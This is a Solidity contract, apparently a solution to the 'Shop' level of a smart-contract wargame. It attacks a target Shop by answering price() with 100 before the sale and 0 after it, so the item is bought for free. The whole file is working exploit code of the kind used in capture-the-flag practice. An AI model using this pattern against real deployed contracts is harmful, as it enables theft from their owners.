// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IShop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract ShopAttacker {
    IShop public instance;

    constructor(address _instance) public {
        instance = IShop(_instance);
    }

    function attack() public {
        instance.buy();
    }

    function price() external view returns (uint256) {
        return instance.isSold() ? 0 : 100;
    }
}
